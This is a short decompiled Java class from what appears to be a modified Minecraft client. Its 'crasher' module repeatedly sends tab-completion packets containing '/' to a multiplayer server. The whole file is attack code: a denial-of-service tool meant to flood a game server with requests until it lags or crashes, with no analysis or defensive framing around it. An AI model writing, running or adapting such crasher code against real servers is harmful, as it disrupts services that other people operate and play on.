// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.acc;

import net.minecraft.network.Packet;
import net.minecraft.client.Minecraft;
import net.minecraft.util.math.BlockPos;
import net.minecraft.network.play.client.CPacketTabComplete;

public class AutoCompleteCrasher3
{
    public static double packets;
    
    static {
        AutoCompleteCrasher3.packets = 10.0;
    }
    
    public static void start() {
        final CPacketTabComplete complete2 = new CPacketTabComplete("/", null, false);
        for (int j = 0; j < AutoCompleteCrasher3.packets; ++j) {
            Minecraft.getMinecraft().player.connection.sendPacket(complete2);
        }
    }
}
